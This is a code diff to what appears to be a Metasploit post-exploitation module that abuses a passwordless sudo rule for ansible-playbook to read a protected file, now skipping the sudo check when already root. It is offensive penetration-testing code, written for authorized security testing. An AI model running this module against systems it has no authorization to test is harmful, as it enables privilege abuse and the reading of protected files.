@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
+  include Msf::Post::Linux::Priv
   include Msf::Auxiliary::Report
   include Msf::Exploit::Local::Ansible
 
@@ -54,27 +55,33 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::NotFound, 'Ansible-playbook executable not found') if ansible_playbook_exe.nil?
     fail_with(Failure::NotFound, "Target file to read not found: #{datastore['FILE']}") unless file?(datastore['FILE'])
 
-    vprint_status('Checking sudo')
-    # check we can sudo
-    cmd = 'sudo -n -l'
-    print_status "Executing: #{cmd}"
-    output = cmd_exec(cmd).to_s
+    # default if we have root and dont need sudo
+    cmd = "#{ansible_playbook_exe} #{datastore['FILE']}"
 
-    if !output || output.start_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')
-      print_error('Current user could not execute sudo -l')
-      fail_with(Failure::NoAccess, 'Unable to execute the sudo command')
+    unless is_root?
+      vprint_status('Checking sudo')
+      # check we can sudo
+      sudo_check = 'sudo -n -l'
+      print_status "Executing: #{sudo_check}"
+      output = cmd_exec(sudo_check).to_s
+
+      if !output || output.start_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')
+        print_error('Current user could not execute sudo -l')
+        fail_with(Failure::NoAccess, 'Unable to execute the sudo command')
+      end
+
+      can_sudo_playbook = false
+      output.lines.each do |line|
+        next unless line.include? 'ansible-playbook'
+        next unless line.include? 'NOPASSWD'
+
+        can_sudo_playbook = true
+      end
+      fail_with(Failure::NoAccess, "ansible-playbook can't be run with a passwordless sudo") unless can_sudo_playbook
+      print_good('System should be exploitable')
+      cmd = "sudo -n #{cmd}"
     end
 
-    can_sudo_playbook = false
-    output.lines.each do |line|
-      next unless line.include? 'ansible-playbook'
-      next unless line.include? 'NOPASSWD'
-
-      can_sudo_playbook = true
-    end
-    fail_with(Failure::NoAccess, "ansible-playbook can't be run with a passwordless sudo") unless can_sudo_playbook
-
-    cmd = "sudo -n #{ansible_playbook_exe} #{datastore['FILE']}"
     print_status "Executing: #{cmd}"
     output = cmd_exec(cmd).to_s
 
